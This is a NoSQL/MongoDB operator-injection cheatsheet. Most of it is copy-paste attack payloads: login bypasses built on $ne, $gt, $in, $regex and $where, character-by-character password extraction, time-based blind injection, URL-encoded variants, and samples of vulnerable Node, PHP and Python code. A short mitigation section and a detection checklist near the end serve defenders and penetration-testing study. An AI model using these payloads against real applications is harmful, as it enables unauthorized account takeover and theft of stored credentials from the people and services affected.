# NoSQL Operator Injection Cheatsheet

## Overview

NoSQL databases use query operators to specify conditions for data retrieval. Attackers can inject these operators to manipulate queries, bypass authentication, and extract data.

---

## 1. Common MongoDB Query Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `$where` | Matches documents satisfying a JavaScript expression | `{"$where": "this.username == 'admin'"}` |
| `$ne` | Matches values **not equal** to specified value | `{"username": {"$ne": ""}}` |
| `$eq` | Matches values **equal** to specified value | `{"username": {"$eq": "admin"}}` |
| `$in` | Matches **any** value in an array | `{"username": {"$in": ["admin", "root"]}}` |
| `$nin` | Matches values **not in** an array | `{"username": {"$nin": ["guest"]}}` |
| `$regex` | Matches values by **regular expression** | `{"username": {"$regex": "^adm"}}` |
| `$gt` | **Greater than** | `{"age": {"$gt": 18}}` |
| `$gte` | **Greater than or equal** | `{"age": {"$gte": 18}}` |
| `$lt` | **Less than** | `{"age": {"$lt": 100}}` |
| `$lte` | **Less than or equal** | `{"age": {"$lte": 100}}` |
| `$exists` | Matches documents where field **exists** | `{"resetToken": {"$exists": true}}` |
| `$type` | Matches documents where field is of specified **type** | `{"username": {"$type": "string"}}` |
| `$or` | Logical **OR** | `{"$or": [{"username": "admin"}, {"username": "root"}]}` |
| `$and` | Logical **AND** | `{"$and": [{"username": "admin"}, {"active": true}]}` |
| `$not` | Logical **NOT** | `{"username": {"$not": {"$eq": "guest"}}}` |
| `$elemMatch` | Matches array elements | `{"roles": {"$elemMatch": {"$eq": "admin"}}}` |
| `$size` | Matches arrays of specified **size** | `{"roles": {"$size": 1}}` |

---

## 2. Injection Methods

### JSON Body Injection

**Original request:**
```json
{"username":"wiener","password":"peter"}
```

**Injected request:**
```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

### URL Parameter Injection

**Original:**
```
username=wiener
```

**Injected:**
```
username[$ne]=invalid
```

**Alternative array syntax:**
```
username[$in][0]=admin&username[$in][1]=administrator
```

### Converting GET to POST with JSON

If URL parameter injection fails:

1. Change request method: `GET` → `POST`
2. Set header: `Content-Type: application/json`
3. Add JSON body with injected operators

**Tip:** Use Burp Suite's "Content Type Converter" extension for automatic conversion.

---

## 3. Authentication Bypass Payloads

### Basic Auth Bypass

Bypass login by matching any user with non-empty credentials:

```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

Or match any non-invalid value:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

### Target Specific Accounts

Target admin accounts using `$in` with common admin usernames:

```json
{"username":{"$in":["admin","administrator","superadmin","root","sysadmin"]},"password":{"$ne":""}}
```

### Using $regex for Username Guessing

```json
{"username":{"$regex":"^admin"},"password":{"$ne":""}}
```

### Using $gt / $gte for Bypass

Match any non-empty string (strings are greater than empty):

```json
{"username":{"$gt":""},"password":{"$gt":""}}
```

### Using $exists

Target users where specific fields exist:

```json
{"username":"admin","password":{"$exists":true}}
```

---

## 4. Data Extraction Techniques

### Extracting Data with $regex (Boolean-Based)

Extract data character by character using regex:

```json
{"username":"admin","password":{"$regex":"^a"}}      // Returns true if password starts with 'a'
{"username":"admin","password":{"$regex":"^ab"}}     // Test second character
{"username":"admin","password":{"$regex":"^abc"}}    // Continue...
```

**Regex patterns for extraction:**
```
^a       - Starts with 'a'
^a.*     - Starts with 'a' followed by anything
^.{5}$   - Exactly 5 characters
^[a-z]   - Starts with lowercase letter
^[0-9]   - Starts with digit
```

### Extracting Field Names

Use `$exists` to discover field names:

```json
{"username":"admin","$where":"Object.keys(this).length > 5"}
```

### Using $where for Data Extraction

```json
{"$where":"this.username == 'admin' && this.password.length > 5"}
{"$where":"this.username == 'admin' && this.password.charAt(0) == 'a'"}
```

---

## 5. $where JavaScript Injection

The `$where` operator allows JavaScript execution, enabling powerful attacks.

### Basic $where Injection

```json
{"$where":"this.username == 'admin'"}
```

### Time-Based Injection (Blind)

```json
{"$where":"this.username == 'admin' && sleep(5000)"}
```

### Data Exfiltration via $where

```json
{"$where":"this.password.match(/^admin.*/)"}
```

### Extracting Password Length

```json
{"$where":"this.username == 'admin' && this.password.length == 8"}
```

### Character-by-Character Extraction

```json
{"$where":"this.username == 'admin' && this.password[0] == 'p'"}
{"$where":"this.username == 'admin' && this.password.charAt(0) == 'p'"}
```

---

## 6. URL-Encoded Payloads

| Payload | URL-Encoded |
|---------|-------------|
| `[$ne]` | `%5B%24ne%5D` |
| `[$gt]` | `%5B%24gt%5D` |
| `[$in]` | `%5B%24in%5D` |
| `[$regex]` | `%5B%24regex%5D` |
| `[$where]` | `%5B%24where%5D` |
| `[$exists]` | `%5B%24exists%5D` |

**Example URL:**
```
https://target.com/login?username[$ne]=invalid&password[$ne]=invalid
```

---

## 7. Quick Payloads Reference

### Authentication Bypass

```json
// Match any user
{"username":{"$ne":""},"password":{"$ne":""}}

// Match any user (alternative)
{"username":{"$gt":""},"password":{"$gt":""}}

// Target admin accounts
{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}

// Regex-based admin targeting
{"username":{"$regex":"admin"},"password":{"$ne":""}}

// Using $or
{"$or":[{"username":"admin"},{"username":"root"}],"password":{"$ne":""}}
```

### Data Extraction

```json
// Password starts with 'a'
{"username":"admin","password":{"$regex":"^a"}}

// Password length check
{"$where":"this.password.length == 8"}

// Character extraction
{"$where":"this.password[0] == 'a'"}

// Field enumeration
{"username":{"$exists":true},"secretField":{"$exists":true}}
```

---

## 8. NoSQL Injection in Different Contexts

### Node.js / Express with MongoDB

Vulnerable code:
```javascript
db.users.find({username: req.body.username, password: req.body.password})
```

Attack:
```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

### PHP with MongoDB

Vulnerable code:
```php
$cursor = $collection->find(['username' => $_POST['username']]);
```

Attack via URL parameters:
```
username[$ne]=admin
```

### Python with PyMongo

Vulnerable code:
```python
users.find_one({"username": request.form['username']})
```

Attack:
```json
{"username":{"$ne":"invalid"}}
```

---

## 9. Detection Checklist

| Test | Payload | Indicator |
|------|---------|-----------|
| Basic operator injection | `{"field":{"$ne":""}}` | Different response |
| URL parameter operators | `field[$ne]=value` | Different response |
| $where injection | `{"$where":"1==1"}` | All results returned |
| $regex injection | `{"field":{"$regex":".*"}}` | All results returned |
| Error-based detection | `{"field":{"$invalid":1}}` | Error message |
| Type confusion | `{"field":["value"]}` | Unexpected behavior |

---

## 10. Prevention & Mitigations

**For defenders:**

1. **Input validation** — Sanitize all user input; reject nested objects
2. **Use parameterized queries** — Avoid string concatenation
3. **Disable JavaScript** — Set `javascriptEnabled: false` in MongoDB config
4. **Least privilege** — Limit database user permissions
5. **Use ODM/ORM properly** — Mongoose schemas with strict typing
6. **Reject unexpected types** — Only accept expected data types

**Mongoose example (secure):**
```javascript
// Reject objects, only accept strings
if (typeof req.body.username !== 'string') {
    return res.status(400).send('Invalid input');
}
```

---

## 11. Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept and modify requests |
| **Content Type Converter** | Convert URL-encoded to JSON |
| **NoSQLMap** | Automated NoSQL injection |
| **nosqli** | NoSQL injection scanner |
| **MongoDB Compass** | Database inspection |

---

## 12. Ready-to-Use Bypass Payloads (Copy & Paste)

### Escaped JSON Payloads (for Burp Suite, curl, etc.)

**Basic bypass — match any non-empty value:**
```
{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}
```

**Alternative — match anything not equal to "invalid":**
```
{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}
```

**Using greater than (matches any string):**
```
{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}
```

**Using not-in empty array:**
```
{\"username\":{\"$nin\":[]},\"password\":{\"$nin\":[]}}
```

**Target specific user, bypass password:**
```
{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}
```

**Using regex to match anything:**
```
{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}
```

**Using $or for multiple conditions:**
```
{\"$or\":[{\"username\":\"admin\"},{\"username\":\"root\"}],\"password\":{\"$ne\":\"\"}}
```

**Using $where:**
```
{\"username\":\"admin\",\"password\":{\"$ne\":\"\"},\"$where\":\"return true\"}
```

### URL Parameter Payloads

**Basic bypass:**
```
username[$ne]=&password[$ne]=
```

**Not equal to invalid:**
```
username[$ne]=invalid&password[$ne]=invalid
```

**Greater than empty:**
```
username[$gt]=&password[$gt]=
```

**Target admin:**
```
username=admin&password[$ne]=
```

**Using regex:**
```
username[$regex]=.*&password[$regex]=.*
```

**Using $in with multiple users:**
```
username[$in][0]=admin&username[$in][1]=root&password[$ne]=
```

### Single Field Bypass (Escaped)

When you only need to bypass one field:

| Purpose | Escaped JSON | URL |
|---------|--------------|-----|
| Not empty | `{\"$ne\":\"\"}` | `[$ne]=` |
| Not invalid | `{\"$ne\":\"invalid\"}` | `[$ne]=invalid` |
| Greater than | `{\"$gt\":\"\"}` | `[$gt]=` |
| Exists | `{\"$exists\":true}` | `[$exists]=true` |
| Regex any | `{\"$regex\":\".*\"}` | `[$regex]=.*` |
| Not in empty | `{\"$nin\":[]}` | `[$nin]=` |

### Quick Copy-Paste Table (Escaped)

| Attack | Escaped JSON Payload |
|--------|----------------------|
| Login bypass (any user) | `{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}` |
| Login bypass (admin) | `{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}` |
| Login bypass ($gt) | `{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}` |
| Login bypass ($regex) | `{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}` |
| Target admins ($in) | `{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]},\"password\":{\"$ne\":\"\"}}` |
| Regex admin users | `{\"username\":{\"$regex\":\"admin\"},\"password\":{\"$ne\":\"\"}}` |
| $where bypass | `{\"$where\":\"return true\"}` |

### Minified One-Liners (Escaped — Ready to Use)

```
{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}
{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}
{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}
{\"username\":{\"$regex\":\".*\"},\"password\":{\"$ne\":\"\"}}
{\"username\":{\"$in\":[\"admin\",\"root\"]},\"password\":{\"$ne\":\"\"}}
{\"$or\":[{\"username\":\"admin\"}],\"password\":{\"$ne\":\"\"}}
{\"username\":{\"$nin\":[]},\"password\":{\"$nin\":[]}}
{\"$where\":\"return true\"}
```

### Raw JSON (for tools that handle escaping automatically)

If your tool handles JSON properly (like Postman or some scripts):

```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":""}}
{"username":{"$regex":".*"},"password":{"$ne":""}}
{"username":{"$in":["admin","root"]},"password":{"$ne":""}}
```

---

## ⚠️ Important Notes

- Always test in authorized environments only
- Operator injection can cause data modification/deletion
- `$where` is often disabled in production environments
- Some frameworks automatically sanitize operators — test thoroughly
- Response differences may be subtle — compare content length and timing
